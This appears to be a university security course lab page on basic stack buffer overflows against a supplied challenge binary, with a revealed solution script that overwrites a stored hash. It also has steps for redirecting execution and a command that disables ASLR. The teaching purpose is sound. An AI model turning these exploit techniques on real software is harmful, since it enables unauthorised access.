---
title: "Lab 1: Basic Buffer Overflows"
weight: 1
draft: false
---

## Overview

{{< callout emoji="💡" >}}

In this lab you will exploit a basic buffer overflow. You will need to analyze
the software to find the vulnerability in order to understand how to solve the
challenge.

**Goals:**

- Understand the concept of a buffer overflow and why it is exploitable.
- Practice reproducing a crash by writing more data than a buffer can hold.
- Use automated tools (Python script or GEF commands) to locate the location of
  the return address on the stack.
- Inject shellcode onto the stack and redirect program execution into that
  shellcode.

**Estimated Time:** `45 Minutes`

{{< /callout >}}

## Instructions

{{% steps %}}

### Download Challenge Binary

{{< downloadbutton file="challenge.bin" text="challenge.bin" >}}

### Reverse the Program

Run the program and look at it in binary ninja to get a feel for this
executable.

{{< question >}}

Explain at a high level what this program does and how it works.

{{< /question >}}

Next analyze the variables used in the `vulnerable_function`. Find the offsets
into the stack frame (relative to the base pointer) which describes where the
variable starts. For example:

- `foo`: `rbp - 0x100`, 32 bytes
- `bar`: `rbp - 0x80`, 0x60 bytes
- `baz`: `rbp - 0x20`, 16 bytes

{{< question >}}

What are the offsets of each of the three variables used in the
`vulnerable_function`? Which is at the lowest and highest address?

{{< /question >}}

Note how many bytes the program is reading as input. Is this larger than the
size of the buffer that is receiving the data? Perhaps you can use this
information to trick the program into printing a successful message.

### Get Past the Hash Check

This binary contains a buffer overflow vulnerability that allows us to overwrite
the stored hash with one we choose. You will write a python script that prints
the output needed to exploit it. If you are more comfortable with something
other than python, then feel free to use that. Here is a starter template:

```python {filename=solution.py}
import sys

# Generate an amount of A's (or your favorite ascii character)
buffer_size = 8
buffer_bytes = b"A" * buffer_size

# Construct the buffer
new_hash_bytes = b"\xc0\x01\xbe\xef"

# Combine everything into a single buffer
buffer = buffer_bytes + new_hash_bytes

# Output the buffer to stdout so it can be piped to sdtin of the
# target process.
sys.stdout.buffer.write(buffer)
```

If you run the script, it will print a the output buffer needed to exploit the
binary. To test it, you can pipe the output of the script in into the challenge
binary's standard input.

```sh
> python3 solution.py | ./challenge

# You can also use it to write the output to a file and read the file as input with gdb/gef
> python3 solution.py > input.bin
> gdb ./challenge
# ...
gef> break vulnerable_function
gef> run < input.bin
# ...
```

Since you don't know the password that corresponds to the hash in the
executable, to solve this challenge you'll need to overwrite the hash with one
you generate from a password you know.

```sh
> echo "my_super_cool_input" | md5sum
```

> [!TIP] HINT: Make sure the hash you calculate uses the same amount of bytes as
> the hash calculation done by the program!

{{< question >}}

Use a buffer overflow attack to cause the program to print "Access granted!".
Include a screenshot showing that you get the correct message.

{{< /question >}}

### Redirect Execution

> [!IMPORTANT]
> Before this part, run the following command. This disables ASLR (which we'll
> talk about more next week), and this will make solving the next part a little
> easier.
>
> ```
> echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
> ```

You can use your buffer overflow primitive to overwrite more than just the
functions local variables. Why not keep writing as many bytes as you can!

{{< question >}}

Trigger a crash by sending a large amount of data (traditionally all `A`
characters) to get the program to segfault.

{{< /question >}}

You should always verify the cause of the crash, but in this case it is because
you have written over the return address with `0xAAAAAAAA` which is most likely
not valid. And so the program triggers a memory access error called a
[segmentation fault](https://en.wikipedia.org/wiki/Segmentation_fault).

<img src="https://www.coengoedegebure.com/content/images/2018/08/memoryoverflow-1.png" alt="TODO" style="background: #fff;" />

![](./memoryoverflow-1.png "Source: https://www.coengoedegebure.com/buffer-overflow-attacks-explained/")

Instead of overwriting the return address with a junk value, you can redirect
execution to an address of your choosing. Write a script that demonstrates this,
by redirecting execution to the `secret_function`.

> [!TIP]
> If you don't want to figure out the calculations to get your custom return
> address in the right place, you can use the `pattern` command in `gef`. First
> generate a pattern
>
> - https://hugsy.github.io/gef/commands/pattern/

{{< question >}}

Include a final version of your script and a screenshot of the program executing
the `secret_function` in your lab guide.

{{< /question >}}

{{% /steps %}}

## Tips

> [!TIP]
>
> - Build up your input slowly to see where it shows up on the stack.
> - Some helpful `gef` commands:
>   | Command                                | Description                                                                   |
>   | :------------------------------------- | :---------------------------------------------------------------------------- |
>   | `gef config context.enable 0`          | Do not show the context window when the debugger breaks. (Use `ctx` instead.) |
>   | `gef config context.nb_lines_stack 20` | Increase the lines displayed in the stack section of the context window.      |
>   | `dereference --length 8 <addr>`        | Show memory like the stack section, but at the specified `addr`.              |

## Solutions

{{% details title="Click to reveal.." closed="true" %}}

### Overwriting the hash

First calculate the hash of your input.

```sh
> python3 -c "print('A'*0x40, end='')" | md5sum
# d289a97565bc2d27ac8b8545a5ddba45  -

# You can also verify this by sending the input to the Challenge
# program.
> python3 -c "print('A'*0x40, end='')" | ./challenge
# ...
# Computed MD5 Hash: d289a97565bc2d27ac8b8545a5ddba45
# ...
```

Then write a script to send the `A's` + the overwritten hash bytes to the
program.

```python
import sys;
# Completely fill buffer with A's
sys.stdout.buffer.write(b'A'*0x40);
# Overwrite the hash buffer with the bytes of the MD5 hash
sys.stdout.buffer.write(b'\xd2\x89\xa9\x75\x65\xbc\x2d\x27\xac\x8b\x85\x45\xa5\xdd\xba\x45')
```

{{% /details %}}

## Submission

{{< callout emoji="📝" >}}

Submit a markdown file with any code you wrote and the answers to questions to
[ELMS](https://umd.instructure.com/courses/1390353/assignments).

{{< /callout >}}
